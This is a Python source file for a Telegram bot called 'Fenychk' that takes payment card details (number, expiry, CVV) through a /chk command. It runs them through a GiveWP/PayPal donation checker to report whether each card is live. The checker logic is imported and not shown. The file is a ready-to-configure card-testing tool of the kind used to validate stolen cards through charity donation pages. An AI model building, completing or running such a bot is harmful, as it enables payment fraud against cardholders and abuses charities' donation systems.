import telebot, os, json, time, random, string, re, html, threading, requests
from telebot import types
from datetime import datetime, timedelta

from gate_config import (
    PAYPAL_API_URL, PAYPAL_DEFAULT_URL, PAYPAL_DEFAULT_PRICE,
    STRIPE_API_URL, STRIPE_DEFAULT_URL,
    GIVEWP_DEFAULT_URL, GIVEWP_DEFAULT_AMOUNT,
    ALTERNATIVE_URLS
)

from givewp_checker import DonationChecker

token = "PUT_YOUR_BOT_TOKEN"
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 123456789
bot_name = "Fenychk"
maker = "@developer"

DATA_FILE = "data.json"
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({}, f)

@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id,"Bot is running.")

def chkk_paypal_givewp(ccx):
    checker = DonationChecker(GIVEWP_DEFAULT_URL, GIVEWP_DEFAULT_AMOUNT)
    return checker.check_card(ccx)

@bot.message_handler(commands=["chk"])
def chk(message):
    try:
        cc = message.text.split(" ",1)[1]
    except:
        bot.reply_to(message,"Send card like: /chk 4111111111111111|12|2026|123")
        return
    bot.reply_to(message,"Checking...")
    res = chkk_paypal_givewp(cc)
    bot.send_message(message.chat.id,f"Result: {res}")

print("Bot started")
bot.infinity_polling()